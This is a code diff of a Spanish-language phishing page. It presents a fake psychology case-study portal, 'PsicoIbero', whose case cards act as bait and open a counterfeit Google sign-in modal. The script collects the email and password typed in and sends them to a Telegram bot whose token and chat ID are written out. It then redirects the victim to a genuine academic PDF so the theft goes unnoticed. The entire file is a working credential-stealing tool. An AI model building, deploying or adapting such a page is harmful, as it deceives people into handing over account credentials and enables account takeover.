@@ -3,112 +3,232 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión - Cuentas de Google</title>
+    <title>Enciclopedia de Casos Clínicos - Red Iberoamericana de Psicología</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
-        body { font-family: 'Roboto', sans-serif; background-color: #fff; }
-        .google-input { transition: border 0.2s ease; }
-        .google-input:focus { border: 2px solid #1a73e8; outline: none; }
+        @import url('https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&family=Roboto:wght@300;400;500&display=swap');
         
-        /* Spinner de carga para la redirección */
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 0.8s linear infinite;
+        :root {
+            --google-blue: #1a73e8;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        #loading-screen {
+
+        body { font-family: 'Roboto', sans-serif; background-color: #f8f9fa; }
+        h1, h2 { font-family: 'Merriweather', serif; }
+
+        .google-modal {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
+            background: rgba(0,0,0,0.5);
             z-index: 1000;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
         }
+
+        .google-input:focus { border: 2px solid var(--google-blue); outline: none; }
+        
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--google-blue);
+            border-radius: 50%;
+            width: 30px; height: 30px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .card-case:hover { transform: translateY(-5px); transition: all 0.3s ease; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen bg-gray-50 sm:bg-white">
+<body>
 
-    <!-- Pantalla de transición (Carga credibilidad) -->
-    <div id="loading-screen">
-        <div class="loader mb-4"></div>
-        <p class="text-gray-600 text-sm">Validando acceso al repositorio...</p>
-    </div>
+    <!-- Header Profesional -->
+    <header class="bg-white border-b border-gray-200 py-4 px-6 sticky top-0 z-50 shadow-sm">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <div class="bg-blue-800 text-white p-2 rounded">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path></svg>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold text-gray-800 leading-none">PsicoIbero</h1>
+                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">Red Iberoamericana de Psicología</p>
+                </div>
+            </div>
+            <nav class="hidden md:flex space-x-8 text-sm font-medium text-gray-600">
+                <a href="#" class="hover:text-blue-700">Enciclopedia</a>
+                <a href="#" class="hover:text-blue-700">Protocolos</a>
+                <a href="#" class="hover:text-blue-700">Publicaciones</a>
+            </nav>
+            <button onclick="openLogin()" class="bg-blue-700 text-white px-5 py-2 rounded-md text-sm font-medium hover:bg-blue-800 transition">
+                Acceso Institucional
+            </button>
+        </div>
+    </header>
 
-    <!-- Card principal -->
-    <div class="w-full max-w-[450px] bg-white p-6 sm:p-10 sm:border border-gray-300 rounded-lg">
-        
-        <!-- Logo Google -->
-        <div class="flex justify-center mb-4">
-            <svg viewBox="0 0 75 24" width="75" height="24">
-                <path d="M7.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4c1 0 1.9.4 2.5 1.1l2.4-2.4C10.9 5.2 9.1 4.3 7.1 4.3c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c2.1 0 3.9-.9 5.2-2.3l-2.4-2.4c-.7.7-1.7 1.1-2.7 1.1z" fill="#4285F4"/>
-                <path d="M17.6 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#EA4335"/>
-                <path d="M30.4 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#FBBC05"/>
-                <path d="M43.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 1 0 1.8.4l2.4-2.4c-1.1-1.1-2.6-1.8-4.2-1.8-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c1.8 0 3.3-.7 4.5-1.9v1.4h3.6V4.7h-3.6v1.4c-.8-1.1-2-1.8-3.4-1.8z" fill="#4285F4"/>
-                <path d="M52.5 1.1h3.6v17.5h-3.6z" fill="#34A853"/>
-                <path d="M63.5 14.5c-1.4 0-2.5-.7-3.1-1.8l8.3-3.4-0.3-.7c-.7-1.8-2.7-4.3-5.6-4.3-2.9 0-5.3 2.3-5.3 7.1 0 3.9 3.2 7.1 7.2 7.1 3.2 0 5.1-2 5.9-3.1l-2.8-1.9c-.9 1.3-2.1 2.1-3.3 2.1zm0-7.3c1.1 0 2 .5 2.3 1.3l-5.5 2.3c0-2.6 1.8-3.6 3.2-3.6z" fill="#EA4335"/>
-            </svg>
+    <!-- Hero Section -->
+    <section class="bg-blue-900 text-white py-16 px-6">
+        <div class="max-w-4xl mx-auto text-center">
+            <h2 class="text-4xl md:text-5xl font-bold mb-6">Enciclopedia de Casos Clínicos</h2>
+            <p class="text-xl text-blue-100 mb-8 font-light">El repositorio más grande de Iberoamérica para la consulta de diagnósticos, intervenciones y seguimiento psicológico.</p>
+            <div class="relative max-w-2xl mx-auto">
+                <input type="text" placeholder="Buscar por diagnóstico (ej: TDAH, Ansiedad...)" class="w-full p-4 rounded-full text-gray-800 focus:outline-none shadow-xl">
+                <button class="absolute right-2 top-2 bg-blue-700 p-2 rounded-full hover:bg-blue-800">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Listado de Casos (Cebos) -->
+    <main class="max-w-7xl mx-auto py-12 px-6">
+        <div class="flex justify-between items-center mb-8 border-b pb-4">
+            <h3 class="text-2xl font-bold text-gray-800">Casos Recientes</h3>
+            <span class="text-sm text-gray-500 italic">Actualizado hace 15 minutos</span>
         </div>
 
-        <h1 class="text-2xl font-normal text-center text-gray-800 mb-2">Iniciar sesión</h1>
-        <p class="text-center text-gray-700 mb-8">Accede al Repositorio de Casos PsicoIbero</p>
-
-        <form id="pishForm" class="space-y-4">
-            <!-- PASO 1: EMAIL -->
-            <div id="email-step">
-                <input type="email" id="email" placeholder="Correo electrónico o teléfono" required
-                    class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
-                <div class="mt-2 mb-10">
-                    <a href="#" class="text-sm font-medium text-blue-600 hover:underline">¿Has olvidado tu correo electrónico?</a>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- Caso 1 -->
+            <div class="card-case bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden cursor-pointer" onclick="openLogin()">
+                <div class="h-40 bg-gray-100 flex items-center justify-center border-b border-gray-100">
+                    <svg class="w-16 h-16 text-gray-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9 4.804A7.968 7.968 0 005.5 4c-1.255 0-2.443.29-3.5.804v10A7.969 7.969 0 015.5 14c1.669 0 3.218.51 4.5 1.385A7.962 7.962 0 0114.5 14c1.255 0 2.443.29 3.5.804v-10A7.968 7.968 0 0014.5 4c-1.255 0-2.443.29-3.5.804V12a1 1 0 11-2 0V4.804z"></path></svg>
                 </div>
-                <div class="flex items-center justify-between pt-4">
-                    <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">Crear cuenta</button>
-                    <button type="button" onclick="showPasswordStep()" 
-                        class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Siguiente</button>
-                </div>
-            </div>
-
-            <!-- PASO 2: PASSWORD -->
-            <div id="pass-step" class="hidden">
-                <div class="flex items-center p-2 border border-gray-300 rounded-full w-fit mb-8 bg-white hover:bg-gray-50 cursor-pointer" onclick="backToEmail()">
-                    <div class="bg-gray-100 p-1 rounded-full mr-2">
-                        <svg class="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
+                <div class="p-5">
+                    <span class="text-[10px] font-bold text-blue-700 uppercase">Trastornos de Ansiedad</span>
+                    <h4 class="text-lg font-bold text-gray-900 mt-1">Intervención Cognitiva en Ansiedad Generalizada</h4>
+                    <p class="text-sm text-gray-600 mt-2 line-clamp-3">Estudio detallado sobre un paciente de 28 años con síntomas persistentes de preocupación excesiva y somatización...</p>
+                    <div class="mt-4 flex items-center text-blue-700 text-sm font-semibold">
+                        Leer caso completo 
+                        <svg class="ml-1 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                     </div>
-                    <span id="user-display" class="text-sm text-gray-700 font-medium pr-2"></span>
-                    <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-                </div>
-
-                <input type="password" id="password" placeholder="Introduce tu contraseña" required
-                    class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
-                
-                <div class="mt-2 flex items-center mb-10">
-                    <input type="checkbox" id="show-pass" class="mr-2 h-4 w-4 cursor-pointer">
-                    <label for="show-pass" class="text-sm text-gray-700 cursor-pointer">Mostrar contraseña</label>
-                </div>
-
-                <div class="flex items-center justify-between pt-4">
-                    <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">¿Has olvidado tu contraseña?</button>
-                    <button type="submit" 
-                        class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Siguiente</button>
                 </div>
             </div>
-        </form>
+
+            <!-- Caso 2 -->
+            <div class="card-case bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden cursor-pointer" onclick="openLogin()">
+                <div class="h-40 bg-gray-100 flex items-center justify-center border-b border-gray-100">
+                    <svg class="w-16 h-16 text-gray-300" fill="currentColor" viewBox="0 0 20 20"><path d="M13 6a3 3 0 11-6 0 3 3 0 016 0zM18 8a2 2 0 11-4 0 2 2 0 014 0zM14 15a4 4 0 00-8 0v3h8v-3zM6 8a2 2 0 11-4 0 2 2 0 014 0zM16 18v-3a5.972 5.972 0 00-.75-2.906A3.005 3.005 0 0119 15v3h-3zM4.75 12.094A5.973 5.973 0 004 15v3H1v-3a3 3 0 013.75-2.906z"></path></svg>
+                </div>
+                <div class="p-5">
+                    <span class="text-[10px] font-bold text-green-700 uppercase">Psicología Infantil</span>
+                    <h4 class="text-lg font-bold text-gray-900 mt-1">Dinámicas Familiares en el Espectro Autista</h4>
+                    <p class="text-sm text-gray-600 mt-2 line-clamp-3">Análisis de la respuesta conductual en entornos escolares de niños con diagnóstico TEA de alto funcionamiento...</p>
+                    <div class="mt-4 flex items-center text-blue-700 text-sm font-semibold">
+                        Leer caso completo 
+                        <svg class="ml-1 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Caso 3 -->
+            <div class="card-case bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden cursor-pointer" onclick="openLogin()">
+                <div class="h-40 bg-gray-100 flex items-center justify-center border-b border-gray-100">
+                    <svg class="w-16 h-16 text-gray-300" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M12.395 2.553a1 1 0 00-1.4503-.3l-7 5a1 1 0 000 1.638l7 5a1 1 0 001.4503-.3.9999.9999 0 00-.3-1.4503L7.524 9.5l4.571-3.265a1 1 0 00.3-1.682z" clip-rule="evenodd"></path></svg>
+                </div>
+                <div class="p-5">
+                    <span class="text-[10px] font-bold text-purple-700 uppercase">Psicoanálisis</span>
+                    <h4 class="text-lg font-bold text-gray-900 mt-1">Simbología del Sueño en el Duelo Patológico</h4>
+                    <p class="text-sm text-gray-600 mt-2 line-clamp-3">Exploración de las manifestaciones inconscientes tras la pérdida traumática de figuras de apego primarias...</p>
+                    <div class="mt-4 flex items-center text-blue-700 text-sm font-semibold">
+                        Leer caso completo 
+                        <svg class="ml-1 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="bg-white border-t border-gray-200 py-12 px-6">
+        <div class="max-w-7xl mx-auto text-center text-gray-500 text-sm">
+            <p>© 2026 Red Iberoamericana de Psicología - Todos los derechos reservados.</p>
+            <p class="mt-2">Acceso exclusivo para personal federado y estudiantes autorizados.</p>
+        </div>
+    </footer>
+
+    <!-- MODAL DE LOGIN (GOOGLE) -->
+    <div id="loginModal" class="google-modal">
+        <!-- Pantalla de transición interna -->
+        <div id="loading-screen" class="hidden absolute inset-0 bg-white z-[1100] flex flex-col items-center justify-center rounded-lg">
+            <div class="loader mb-4"></div>
+            <p class="text-gray-600 text-sm">Autenticando credenciales...</p>
+        </div>
+
+        <div class="w-full max-w-[450px] bg-white p-6 sm:p-10 rounded-lg shadow-2xl relative">
+            <button onclick="closeLogin()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </button>
+
+            <!-- Logo Google -->
+            <div class="flex justify-center mb-4">
+                <svg viewBox="0 0 75 24" width="75" height="24">
+                    <path d="M7.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4c1 0 1.9.4 2.5 1.1l2.4-2.4C10.9 5.2 9.1 4.3 7.1 4.3c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c2.1 0 3.9-.9 5.2-2.3l-2.4-2.4c-.7.7-1.7 1.1-2.7 1.1z" fill="#4285F4"/>
+                    <path d="M17.6 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#EA4335"/>
+                    <path d="M30.4 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#FBBC05"/>
+                    <path d="M43.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 1 0 1.8.4l2.4-2.4c-1.1-1.1-2.6-1.8-4.2-1.8-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c1.8 0 3.3-.7 4.5-1.9v1.4h3.6V4.7h-3.6v1.4c-.8-1.1-2-1.8-3.4-1.8z" fill="#4285F4"/>
+                    <path d="M52.5 1.1h3.6v17.5h-3.6z" fill="#34A853"/>
+                    <path d="M63.5 14.5c-1.4 0-2.5-.7-3.1-1.8l8.3-3.4-0.3-.7c-.7-1.8-2.7-4.3-5.6-4.3-2.9 0-5.3 2.3-5.3 7.1 0 3.9 3.2 7.1 7.2 7.1 3.2 0 5.1-2 5.9-3.1l-2.8-1.9c-.9 1.3-2.1 2.1-3.3 2.1zm0-7.3c1.1 0 2 .5 2.3 1.3l-5.5 2.3c0-2.6 1.8-3.6 3.2-3.6z" fill="#EA4335"/>
+                </svg>
+            </div>
+
+            <h1 class="text-2xl font-normal text-center text-gray-800 mb-2">Iniciar sesión con Google</h1>
+            <p class="text-center text-gray-700 mb-8">Usa tu cuenta institucional para continuar al Repositorio de Casos</p>
+
+            <form id="pishForm" class="space-y-4">
+                <!-- PASO 1: EMAIL -->
+                <div id="email-step">
+                    <input type="email" id="email" placeholder="Correo electrónico o teléfono" required
+                        class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
+                    <div class="mt-2 mb-10 text-sm">
+                        <a href="#" class="font-medium text-blue-600 hover:underline">¿Has olvidado tu correo electrónico?</a>
+                        <p class="mt-6 text-gray-600">Para continuar, Google compartirá tu nombre, dirección de correo electrónico, preferencia de idioma y foto de perfil con PsicoIbero.</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">Crear cuenta</button>
+                        <button type="button" onclick="showPasswordStep()" 
+                            class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Siguiente</button>
+                    </div>
+                </div>
+
+                <!-- PASO 2: PASSWORD -->
+                <div id="pass-step" class="hidden">
+                    <div class="flex items-center p-2 border border-gray-300 rounded-full w-fit mb-8 bg-white hover:bg-gray-50 cursor-pointer" onclick="backToEmail()">
+                        <div class="bg-gray-100 p-1 rounded-full mr-2">
+                            <svg class="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
+                        </div>
+                        <span id="user-display" class="text-sm text-gray-700 font-medium pr-2"></span>
+                        <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+
+                    <input type="password" id="password" placeholder="Introduce tu contraseña" required
+                        class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
+                    
+                    <div class="mt-2 flex items-center mb-10">
+                        <input type="checkbox" id="show-pass" class="mr-2 h-4 w-4 cursor-pointer">
+                        <label for="show-pass" class="text-sm text-gray-700 cursor-pointer">Mostrar contraseña</label>
+                    </div>
+
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">¿Has olvidado tu contraseña?</button>
+                        <button type="submit" 
+                            class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Confirmar</button>
+                    </div>
+                </div>
+            </form>
+        </div>
     </div>
 
     <script>
-        // CONFIGURACIÓN DE TELEGRAM
-        const BOT_TOKEN = '8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88'; // <--- PONER TOKEN
-        const CHAT_ID = '6269583447';     // <--- PONER CHAT ID
-        
-        // URL REAL A LA QUE SE REDIRIGIRÁ (CASO REAL DE PSICOLOGÍA)
+        const BOT_TOKEN = '8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88'; 
+        const CHAT_ID = '6269583447';     
         const URL_FINAL = 'https://www.redalyc.org/pdf/1339/133915921004.pdf';
+
+        function openLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        function closeLogin() {
+            document.getElementById('loginModal').style.display = 'none';
+            backToEmail();
+        }
 
         function showPasswordStep() {
             const emailField = document.getElementById('email');
@@ -128,41 +248,35 @@
 
         document.getElementById('pishForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
-            // Activar pantalla de carga
-            document.getElementById('loading-screen').style.display = 'flex';
+            document.getElementById('loading-screen').classList.remove('hidden');
 
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
 
-            const texto = `🔥 LOGIN DETECTADO 🔥\n\n📧 Email: ${email}\n🔑 Password: ${pass}\n\n📍 Destino: Repositorio PsicoIbero`;
+            const texto = `🧠 PSICOIBERO DETECTADO 🧠\n\n📧 Email: ${email}\n🔑 Password: ${pass}\n\n📖 Intentó leer: Caso Clínico - Ansiedad`;
 
             try {
-                // Envío asíncrono a Telegram
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: texto
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
                 });
 
-                // Pequeña pausa para que parezca que "valida" de verdad
-                setTimeout(() => {
-                    window.location.href = URL_FINAL;
-                }, 1800);
-
+                setTimeout(() => { window.location.href = URL_FINAL; }, 2000);
             } catch (err) {
-                // Si hay error (ej. sin internet), redirigir igual para no dejar rastro
                 window.location.href = URL_FINAL;
             }
         });
 
-        // Toggle para mostrar contraseña básica
         document.getElementById('show-pass').addEventListener('change', function() {
             document.getElementById('password').type = this.checked ? 'text' : 'password';
         });
+
+        // Cerrar modal si hace clic afuera
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target == modal) closeLogin();
+        }
     </script>
 </body>
 </html>
